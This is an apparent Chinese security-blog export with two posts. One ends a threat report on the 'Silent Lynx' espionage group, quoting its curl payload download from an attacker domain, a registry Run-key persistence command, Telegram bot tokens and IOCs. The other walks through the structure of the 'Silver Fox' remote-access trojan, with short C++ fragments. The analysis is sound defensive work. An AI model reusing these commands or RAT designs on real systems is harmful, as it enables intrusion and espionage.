src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105825-09nv3qj.png" class="" title="image-20250122105825-09nv3qj"><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105828-1eahtc2.png" class="" title="image-20250122105828-1eahtc2"><h1 id="基础设施追踪与溯源"><a href="#基础设施追踪与溯源" class="headerlink" title="基础设施追踪与溯源"></a>基础设施追踪与溯源</h1><p>在上一部分中，我们看到威胁行为者利用 Telegram Bot 在受害者系统上执行操作以及进行下载等任务。幸运的是，我们在 PowerShell 脚本中发现了硬编码的 Bot 令牌，从中获取了一些有趣的信息。这就是在此次活动中被用于将内容转发给威胁行为者的 Telegram 机器人。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105904-ktwe9oh.png" class="" title="image-20250122105904-ktwe9oh"><p>我们还可以看到威胁行为者在目标计算机上执行了一些常见命令，如 whoami、ipconfig 等</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105913-vnsxp3c.png" class="" title="image-20250122105913-vnsxp3c"><p>我们还发现了一个有趣的情况，威胁行为者（TA）从一个网络服务器下载恶意有效载荷，并在被攻陷的系统上建立持久化机制。通过命令 “cmd &#x2F;c curl -o c:\users\public\gservice.exe hxxps:&#x2F;&#x2F;<a href="https://pweobmxdlboi.com/147.exe">pweobmxdlboi.com&#x2F;147.exe</a>” ，威胁行为者从远程服务器下载了一个恶意可执行文件，并将其保存为 “c:\users\public” 目录下的 “gservice.exe”。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105940-m2wj05s.png" class="" title="image-20250122105940-m2wj05s"><p>为确保持久化，威胁行为者执行了一个注册表修改命令：“REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run &#x2F;v WinUpTask &#x2F;t REG_SZ &#x2F;d c:\users\public\gservice.exe&#x2F;f”，该命令将可执行文件添加到 Windows 的 “运行” 键中，这样每当用户登录时，它就会自动启动。随后，攻击者使用 “REG query” 命令来验证修改，并通过消息 “Операция успешно завершена”（“操作已成功完成”）确认持久化机制已成功建立。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122105951-9j456kb.png" class="" title="image-20250122105951-9j456kb"><p>据信，其中一名受感染的受害者与土库曼斯坦和吉尔吉斯斯坦之间的外交行动密切相关。存在敏感文件，如 “Turkmenistanyn Gyrgyz Respublikasyndaky Ilcihanasynyn meyilnamasy.docx”，这表明攻击者以该受害者为目标，收集有关外交计划和关系的情报，这意味着此次活动的主要目标之一是进行间谍活动，而且目标不仅限于银行，还包括其他政府机构。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122110009-8tldd1q.png" class="" title="image-20250122110009-8tldd1q"><p>在追踪同一威胁行为者（实际上是同一操作员，使用相同的 Telegram 用户）发起的其他活动时，我们发现该威胁行为者还使用了其他基于 Telegram 的机器人，对同一地理位置的不同受害者发动攻击。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122110021-elogymc.png" class="" title="image-20250122110021-elogymc"><p>此外，我们发现威胁行为者一直在使用一个名为 resocks 的红队开源工具，该工具被托管在他们的基础设施中。</p><img src="/2025/01/22/%E6%8F%AD%E7%A7%98-%E2%80%9C%E6%B2%89%E9%BB%98%E5%B1%B1%E7%8C%AB%E2%80%9D%EF%BC%88Silent-Lynx%EF%BC%89%E9%AB%98%E7%BA%A7%E6%8C%81%E7%BB%AD%E5%A8%81%E8%83%81%E7%BB%84%E7%BB%87%EF%BC%9A%E9%92%88%E5%AF%B9%E5%90%89%E5%B0%94%E5%90%89%E6%96%AF%E6%96%AF%E5%9D%A6%E5%8F%8A%E5%91%A8%E8%BE%B9%E5%9B%BD%E5%AE%B6%E7%9A%84%E6%81%B6%E6%84%8F%E6%94%BB%E5%87%BB/image-20250122110027-t5ztuly.png" class="" title="image-20250122110027-t5ztuly"><p>威胁行为者托管恶意植入程序的域名如下：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>hxxps:[&#x2F;&#x2F;]pweobmxdlboi[.]com</td></tr><tr><td>hxxps:[&#x2F;&#x2F;]document[.]hometowncity[.]cloud</td></tr><tr><td>hxxps:[&#x2F;&#x2F;]mailboxdownload[.]com</td></tr></tbody></table><p>进一步追踪发现，威胁行为者还利用 Google Drive 将更多有效载荷下载到受害者系统中，目前依赖于 C++、MSIL 植入程序。这些植入程序要么嵌入了恶意 PowerShell 脚本，要么从诸如 Pastebin 之类的文本共享服务下载，并且在最近的活动中依赖 Telegram 进行数据渗出和命令与控制服务 。</p><h1 id="归因分析"><a href="#归因分析" class="headerlink" title="归因分析"></a>归因分析</h1><p>在描述一个威胁行为者或组织时，归因分析是一项至关重要的指标。它涉及分析和关联多个领域，包括战术、技术和程序（TTPs）、代码相似性和重用情况、威胁行为者的动机，有时还包括操作失误。</p><p>在我们对 “沉默山猫”（Silent Lynx）的持续追踪过程中，发现它与一个总部位于哈萨克斯坦的威胁行为者 &#x2F; 组织（被思科 Talos 团队识别为 YoroTrooper）存在显著的相似之处和重叠部分。让我们来探讨一下 “沉默山猫” 和 YoroTrooper 之间的一些关键重叠点。</p><ul><li><strong>工具库</strong>：思科 Talos 的研究人员观察到，YoroTrooper 经常修改和更换其工具集，以此创建一种伪反检测机制。在 YoroTrooper 最近的行动中，对基于 PowerShell 的工具存在严重依赖。同样，“沉默山猫” 也表现出对 PowerShell 工具的高度依赖，并且在两组的代码中观察到了重叠部分。</li><li><strong>动机</strong>：“沉默山猫” 和 YoroTrooper 有着相似的动机，主要都是针对吉尔吉斯斯坦及其邻国的政府机构进行间谍活动。</li></ul><p>除了这些例子之外，还有其他有力的相似之处进一步证实了这两个威胁组织之间的联系。我们有中等程度的把握认为，“沉默山猫” 是一个起源于哈萨克斯坦的威胁行为者，很可能与 YoroTrooper 共享资源，因此可将其定位为一个以哈萨克斯坦为导向的威胁组织。</p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>“沉默山猫” 的攻击活动展示了一种复杂的多阶段攻击策略，使用了 ISO 文件、C++ 加载器、PowerShell 脚本和 Golang 植入程序。他们对 Telegram 机器人的依赖，用于命令和控制，再加上诱饵文档以及针对特定区域的攻击，突出了他们在中亚和 SPECA 成员国进行间谍活动的重点。“沉默山猫” 与 YoroTrooper 的重叠表明了资源共享，进一步证实了其作为一个来自哈萨克斯坦的威胁组织的归因。</p><h3 id="入侵检测指标（IOCs）"><a href="#入侵检测指标（IOCs）" class="headerlink" title="入侵检测指标（IOCs）"></a>入侵检测指标（IOCs）</h3><table><thead><tr><th>文件类型</th><th>文件名</th><th>SHA-256</th></tr></thead><tbody><tr><td>EXE</td><td>147.exe</td><td>efb700681713cd50a2addd1fea6b7ee80c084467d3e87668688b9f06642062ba</td></tr><tr><td>EXE</td><td>Xerox_Scan17510875802718752175.exe</td><td>e6f76a73180b4f2947764f4de57b52d037b482ecela88dab9d3290e76be8c098</td></tr><tr><td>EXE</td><td>14789.exe</td><td>3560660162f2268d52b69382c78192667a7eee5796d77418a8609b2f1709f834</td></tr><tr><td>EXE</td><td>resocks.exe</td><td>297d1afa309cdf0c84f04994ffd59eele1175377c1a0a561eb25869909812c9c</td></tr><tr><td>ISO</td><td>20241228_140656.iso</td><td>c045344b23fc245f35a0ff4a6d6fa744d580cde45c8cd0849153dee7dce1d80c</td></tr><tr><td>EXE</td><td>Приложение №14 - 214 - 14 - 12 - 5 - 15docx</td><td>1b76931775aa4de29df27a9de764b22f17ca117d6e5ae184f4ef617c970fc007</td></tr><tr><td>EXE</td><td>sokcs.exe</td><td>66294c9925ad454d5640f4fe753da9e7d6742f60b093ed97be88fcdd47b04445</td></tr><tr><td>EXE</td><td>udadd.exe</td><td>99c6017c8658faf678f1b171c8eb5d5fa7e7d08e0a0901b984a8e3e1fab565cd</td></tr><tr><td>域名 &#x2F; URL</td><td>hxxps:&#x2F;&#x2F;<a href="https://pweobmxdlboi.com/">pweobmxdlboi.com</a></td><td></td></tr><tr><td>域名 &#x2F; URL</td><td>hxxps:&#x2F;&#x2F;document.hometowncity.cloud</td><td></td></tr><tr><td>域名 &#x2F; URL</td><td>hxxps:&#x2F;&#x2F;<a href="https://mailboxdownload.com/">mailboxdownload.com</a></td><td></td></tr><tr><td>域名 &#x2F; URL</td><td>hxxps:&#x2F;&#x2F;<a href="https://api.telegram.org/bot8171872935:AAHLoudjpHz1bxA26bV5wPuOFL3LOHE160k">api.telegram.org&#x2F;bot8171872935:AAHLoudjpHz1bxA26bV5wPuOFL3LOHE160k</a></td><td></td></tr><tr><td>域名 &#x2F; URL</td><td>hxxps:&#x2F;&#x2F;<a href="https://api.telegram.org/bot7898508392:AAF5FPbJ1jlPQfqCIGnx">api.telegram.org&#x2F;bot7898508392:AAF5FPbJ1jlPQfqCIGnx</a> - zNdw2R5tF_Xxt0</td><td></td></tr></tbody></table><h3 id="MITRE-ATT-CK-框架相关信息"><a href="#MITRE-ATT-CK-框架相关信息" class="headerlink" title="MITRE ATT&amp;CK 框架相关信息"></a>MITRE ATT&amp;CK 框架相关信息</h3><table><thead><tr><th>策略</th><th>技术 ID 及名称</th></tr></thead><tbody><tr><td>侦察</td><td>T1589.002：收集受害者身份信息：电子邮件地址</td></tr><tr><td>侦察</td><td>T1204.002：（文档未明确此技术具体内容）</td></tr><tr><td>初始访问</td><td>T1078.002：用户执行：恶意文件（有效账户：域账户）</td></tr><tr><td>执行</td><td>T1059.001：命令和脚本解释器：PowerShell</td></tr><tr><td>持久化</td><td>T1547.001：注册表运行键 &#x2F; 启动文件夹</td></tr><tr><td>凭证访问</td><td>T1056.001：输入捕获：键盘记录</td></tr><tr><td>凭证访问</td><td>T1552.001：未受保护的凭证：文件中的凭证</td></tr><tr><td>发现</td><td>T1087：账户发现</td></tr><tr><td>发现</td><td>T1083：文件和目录发现</td></tr><tr><td>发现</td><td>T1046：网络服务发现</td></tr><tr><td>发现</td><td>T1012：查询注册表</td></tr><tr><td>发现</td><td>T1018：远程系统发现</td></tr><tr><td>发现</td><td>T1016：系统网络配置发现</td></tr><tr><td>发现</td><td>T1007：系统服务发现</td></tr><tr><td>收集</td><td>T1560.001：归档收集的数据：通过实用工具进行归档</td></tr><tr><td>渗出</td><td>T1567.002：渗出到云存储</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>APT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>APT</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>银狐源码解读--核心组件模块</title>
    <link href="/2024/12/06/%E9%93%B6%E7%8B%90%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E6%A8%A1%E5%9D%97/"/>
    <url>/2024/12/06/%E9%93%B6%E7%8B%90%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E6%A8%A1%E5%9D%97/</url>
    
    <content type="html"><![CDATA[<p>[toC]</p><h1 id="核心模块组件介绍"><a href="#核心模块组件介绍" class="headerlink" title="核心模块组件介绍"></a>核心模块组件介绍</h1><blockquote><p>可以在公众号获取原文，目前网站不支持mermaid，可公众号下载原始PDF!!!</p></blockquote><h2 id="HPSocket"><a href="#HPSocket" class="headerlink" title="HPSocket"></a>HPSocket</h2><p>使用的公开技术，基于于 IOCP&#x2F;EPOLL 通信模型，结合内存池、私有堆等技术，实现高效的内存管理，支持大规模、高并发的通信场景。Git地址：<a href="https://github.com/ldcsaa/HP-Socket">https://github.com/ldcsaa/HP-Socket</a></p><img src="/2024/12/06/%E9%93%B6%E7%8B%90%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E6%A8%A1%E5%9D%97/pic1.png" class="" title="pic1"><h2 id="shellcode："><a href="#shellcode：" class="headerlink" title="shellcode："></a>shellcode：</h2><ol><li>在 ntdll_entry 函数中，程序通过 LoadLibraryA 加载 kernel32.dll 和 ntdll.dll，并使用 GetProcAddress 获取所需的函数地址。</li><li>通过 mytcp 和 myudp 函数实现 TCP 和 UDP 的网络通信。程序根据 ShellCodeInfo 结构中的信息进行连接和数据传输。</li><li>定义了一些数据结构，如 ShellCodeInfo、func_t 等，用于存储网络通信所需的信息和函数指针。</li></ol><img src="/2024/12/06/%E9%93%B6%E7%8B%90%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E6%A8%A1%E5%9D%97/pic2.png" class="" title="pic2"><h2 id="上线模块："><a href="#上线模块：" class="headerlink" title="上线模块："></a>上线模块：</h2><p>函数调用关系</p><pre class="mermaid">graph TD;    A[_tmain] --> B[Analyze]    A --> C[SetUnhandledExceptionFilter]    B --> D[Getfindinfo]    B --> E[RegOpenKeyEx]    B --> F[RegQueryValueEx]    C --> G[ExceptionFilter]    G --> H[GenerateMiniDump]    A --> I[CreateThread]    I --> J[MainThread]    J --> K[Socket Communication]</pre><p>说明</p><ul><li><strong>A</strong>: 程序入口 <code>_tmain</code>，设置异常处理器并调用 <code>Analyze</code>。</li><li><strong>B</strong>: <code>Analyze</code> 函数用于提取配置信息。</li><li><strong>C</strong>: 设置未处理异常过滤器，调用 <code>ExceptionFilter</code>。</li><li><strong>D</strong>: <code>Getfindinfo</code> 用于从配置中提取信息。</li><li><strong>E</strong> 和 <strong>F</strong>: 从注册表中读取配置信息。</li><li><strong>G</strong>: <code>ExceptionFilter</code> 捕获异常并调用 <code>GenerateMiniDump</code>。</li><li><strong>H</strong>: <code>GenerateMiniDump</code> 生成转储文件。</li><li><strong>I</strong>: 创建主线程，调用 <code>MainThread</code>。</li><li><strong>J</strong>: <code>MainThread</code> 处理网络通信。</li></ul><p>部分代码解释：</p><ol><li><p><strong>信息结构体定义</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">Info MyInfo = &#123; ... &#125;;<br><br></code></pre></td></tr></table></figure><ul><li>****定义一个 <code>Info</code> 结构体实例 <code>MyInfo</code>，用于存储配置信息，如 IP 地址、端口、TCP&#x2F;UDP 标志等。</li></ul></li><li><p><strong>全局变量</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HANDLE hThread = <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> changeip = <span class="hljs-literal">false</span>;<br><span class="hljs-type">int</span> m_time_con = <span class="hljs-number">0</span>;<br>TCHAR szAddress[<span class="hljs-number">255</span>];  <span class="hljs-comment">//ip</span><br>TCHAR szPort[<span class="hljs-number">30</span>];      <span class="hljs-comment">//端口</span><br>TCHAR szPassword[<span class="hljs-number">255</span>]; <span class="hljs-comment">//通行密码</span><br>BOOL IsTcp;            <span class="hljs-comment">//通信模式</span><br><br></code></pre></td></tr></table></figure><ul><li>****定义全局变量，用于线程管理、IP 地址、端口、密码和通信模式的存储。</li></ul></li><li><p><strong><code>Getfindinfo</code> 函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Getfindinfo</span><span class="hljs-params">(TCHAR* s, <span class="hljs-type">const</span> TCHAR* f1, TCHAR* outstring, BOOL* user)</span></span>;<br><br></code></pre></td></tr></table></figure><ul><li>****从给定字符串中提取特定信息（如 IP 地址和端口），并将其存储到输出参数中。</li></ul></li><li><p><strong><code>Analyze</code> 函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Analyze</span><span class="hljs-params">()</span></span>;<br><br></code></pre></td></tr></table></figure><ul><li>****分析配置信息，调用 <code>Getfindinfo</code> 函数从配置字符串和注册表中提取信息。</li></ul></li><li><p><strong><code>MainThread</code> 函数</strong> </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">MainThread</span><span class="hljs-params">(LPVOID dllMainThread)</span></span><br><span class="hljs-function"></span>&#123;<br>ISocketBase* socketClient;<br><span class="hljs-keyword">if</span> (MyInfo.IsTcp == <span class="hljs-number">1</span>)<br>socketClient = <span class="hljs-keyword">new</span> <span class="hljs-built_in">CTcpSocket</span>();<br><span class="hljs-keyword">else</span><br>socketClient = <span class="hljs-keyword">new</span> <span class="hljs-built_in">CUdpSocket</span>();<br><br><span class="hljs-keyword">if</span> (socketClient-&gt;<span class="hljs-built_in">Connect</span>(MyInfo.szAddress, MyInfo.szPort))<br>&#123;<br><span class="hljs-function">CRegeditManager<span class="hljs-title">manager</span><span class="hljs-params">(socketClient)</span></span>;<br>socketClient-&gt;<span class="hljs-built_in">run_event_loop</span>();<br>&#125;<br><span class="hljs-built_in">SAFE_DELETE</span>(socketClient);<br><span class="hljs-keyword">if</span> (MyInfo.RunDllEntryProc)<br><span class="hljs-built_in">ExitProcess</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>****主线程函数，负责初始化网络连接，循环处理网络通信。</li></ul></li><li><p><strong><code>GenerateMiniDump</code> 函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GenerateMiniDump</span><span class="hljs-params">(PEXCEPTION_POINTERS pExceptionPointers)</span></span>;<br><br></code></pre></td></tr></table></figure><ul><li>****生成崩溃转储文件，以便在程序异常时进行调试。</li></ul></li><li><p><strong><code>ExceptionFilter</code> 函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">LONG WINAPI <span class="hljs-title">ExceptionFilter</span><span class="hljs-params">(LPEXCEPTION_POINTERS lpExceptionInfo)</span></span>;<br><br></code></pre></td></tr></table></figure><ul><li>****捕获未处理的异常并调用 <code>GenerateMiniDump</code> 生成转储文件。</li></ul></li><li><p><strong><code>_tmain</code> 函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[]);<br><br></code></pre></td></tr></table></figure><ul><li>****程序的入口点，设置异常处理器，隐藏控制台窗口，调用 <code>Analyze</code> 函数并创建主线程。</li></ul></li><li><p><strong>DLL 相关函数</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)</span></span>;<br><br></code></pre></td></tr></table></figure><ul><li>****DLL 的入口点，根据不同的调用原因执行相应的操作。</li></ul></li></ol><p>上线模块中 内核管理内容</p><p>文件解读</p><ol><li><code>unsigned int __stdcall Loop_DllManager(void* pVoid);</code> 函数：负责加载 DLL 并管理其生命周期，包括注册表操作和进程监控。</li><li><code>CKernelManager::CKernelManager(ISocketBase* pClient, BOOL bpuppet);</code> 构造函数：初始化 CKernelManager 对象，设置工作线程和是否为木偶模式。</li><li><code>CKernelManager::~CKernelManager();</code> 析构函数：释放工作线程的句柄，清理资源。</li><li><code>void CKernelManager::runbin();</code> 函数：启动工作线程并在启动后断开连接。</li><li><code>void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize);</code> 函数：处理接收到的数据，进行注册表读写和 DLL 运行。</li><li><code>BOOL buildremoteprocess(byte* data, int size, PROCESS_INFORMATION* pi);</code> 函数：创建远程进程并将数据写入其内存。</li><li><code>bool pid_is_running(DWORD pid);</code> 函数：检查指定进程 ID 是否仍在运行。</li><li><code>int memfind(const char* mem, const char* str, int sizem, int sizes);</code> 函数：在内存中查找指定字符串的位置。</li></ol><img src="/2024/12/06/%E9%93%B6%E7%8B%90%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB-%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6%E6%A8%A1%E5%9D%97/pic3.png" class="" title="pic3.png"><h2 id="代理映射模块"><a href="#代理映射模块" class="headerlink" title="代理映射模块"></a>代理映射模块</h2><p>主要作用是实现一个网络代理插件，能够通过TCP或UDP协议与远程服务器进行通信</p><p><strong>函数关系调用流程图</strong></p><pre class="mermaid">graph TD;    A[WinMain] --> B[SetUnhandledExceptionFilter]    A --> C["CreateThread(MainThread)"]    C --> D[MainThread]    D --> E[ISocketBase::Connect]    E --> F[CProxyManager]    D --> G[run_event_loop]    A --> H[DllMain]    H --> I[Main]    I --> D    H --> J[run]    J --> D</pre><p><strong>关键组件介绍：</strong></p><ul><li><strong>WinMain</strong>: 应用程序的入口点，设置未处理异常过滤器并创建主线程。</li><li><strong>MainThread</strong>: 负责初始化网络连接并处理网络通信。</li><li><strong>ISocketBase</strong>: 抽象基类，用于网络连接的实现（TCP或UDP）。</li><li><strong>CProxyManager</strong>: 管理网络代理的类。</li><li><strong>DllMain</strong>: DLL的入口点，处理DLL的加载和卸载。</li><li><strong>Main</strong>: 导出函数，用于设置代理信息并启动主线程。</li><li><strong>run</strong>: 导出函数，用于启动主线程以处理网络通信。</li></ul><p><strong>函数内容：</strong></p><ol><li><code>DWORD WINAPI MainThread(LPVOID dllMainThread)</code>: 主线程函数，负责初始化网络连接，循环处理网络通信。</li><li><code>int GenerateMiniDump(PEXCEPTION_POINTERS pExceptionPointers)</code>: 生成迷你转储文件，用于异常处理和调试。</li><li><code>LONG WINAPI ExceptionFilter(LPEXCEPTION_POINTERS lpExceptionInfo)</code>: 异常过滤器，处理未捕获的异常并生成转储文件。</li><li><code>int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR szCmdLine, int iCmdShow)</code>: 应用程序入口点，设置异常处理和启动主线程。</li><li><code>BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</code>: DLL的入口点，处理DLL的加载和卸载。</li><li><code>extern &quot;C&quot; __declspec(dllexport) bool Main(TCHAR * ip, DWORD port, BOOL IsTcp, BOOL RunDllEntryProc)</code>: 导出函数，用于设置代理信息并启动主线程。</li><li><code>extern &quot;C&quot; __declspec(dllexport) bool run()</code>: 导出函数，用于启动主线程以处理网络通信。</li></ol><h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><p>该代码实现了一个文件管理器类 CFileManager，用于处理文件的上传、下载、删除、压缩等操作，并与远程客户端进行通信。</p><ol><li><strong><code>CFileManager::CFileManager(ISocketBase* pClient)</code></strong> 函数：构造函数，初始化文件管理器，设置桌面和线程，分配内存并发送驱动器列表。</li><li><strong><code>CFileManager::~CFileManager()</code></strong> 函数：析构函数，清理资源，关闭文件句柄，释放内存。</li><li><strong><code>void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)</code></strong> 函数：处理接收到的数据，根据命令类型调用相应的处理函数。</li><li><strong><code>bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)</code></strong> 函数：确保指定的目录路径存在，如果不存在则创建。</li><li><strong><code>BOOL CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)</code></strong> 函数：打开指定的文件，使用注册表查找文件关联的程序。</li><li><strong><code>HANDLE CFileManager::ImpersonateLoggedOnUserWrapper()</code></strong> 函数：获取当前登录用户的令牌，以便进行用户模拟。</li><li><strong><code>UINT CFileManager::SendDriveList()</code></strong> 函数：获取并发送当前系统的驱动器列表及其属性。</li><li><strong><code>UINT CFileManager::SendFilesList(TCHAR* lpszDirectory)</code></strong> 函数：发送指定目录下的文件列表。</li><li><strong><code>bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)</code></strong> 函数：删除指定的目录及其内容。</li><li><strong><code>void CFileManager::SendToken(BYTE token)</code></strong> 